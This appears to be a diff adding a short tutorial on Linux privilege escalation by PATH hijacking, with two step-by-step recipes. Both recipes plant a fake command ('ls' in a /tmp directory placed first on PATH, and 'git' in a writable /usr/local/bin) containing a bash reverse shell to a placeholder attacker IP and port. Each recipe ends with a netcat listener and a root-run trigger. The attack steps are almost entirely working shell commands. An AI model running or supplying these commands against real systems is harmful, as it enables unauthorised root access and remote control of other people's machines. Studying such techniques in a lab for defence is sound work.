@@ -1,0 +1,37 @@
+Adding a Malicious Directory to PATH
+
+1. Set Up the Target Script (Run as Root) Create a sample script that the root user might run periodically:
+sudo bash -c 'echo -e "#!/bin/bash\nls -la /root" > /usr/local/bin/backup.sh'
+sudo chmod +x /usr/local/bin/backup.sh
+
+2. Prepare the Malicious Command (Run as Attacker) Create a fake ls command that gives you a reverse shell:
+mkdir /tmp/malicious_path
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1' > /tmp/malicious_path/ls
+chmod +x /tmp/malicious_path/ls
+
+3. Modify the PATH (Run as Attacker) Add your malicious directory to the beginning of the PATH:
+export PATH=/tmp/malicious_path:$PATH
+
+4. Trigger the Script (Run as Root) Simulate the root user running the vulnerable script:
+sudo /usr/local/bin/backup.sh
+
+5. Catch the Shell (Run on Your Machine) Start a listener on your machine:
+nc -lvnp <YOUR_PORT>
+
+Hijacking an Existing Writable Directory in PATH
+
+1. Find a Writable Directory in PATH (Run as Attacker)
+echo $PATH
+find /usr/local/bin -type d -writable 2>/dev/null
+
+2. Plant the Malicious Command (Run as Attacker) If /usr/local/bin is writable, place your malicious command there:
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1' > /usr/local/bin/git
+chmod +x /usr/local/bin/git
+
+3. Catch the Shell (Run on Your Machine) Start your listener:
+nc -lvnp <YOUR_PORT>
+
+4. Trigger the Attack (Run as Root) Simulate the root user running git:
+sudo git --version
+
+
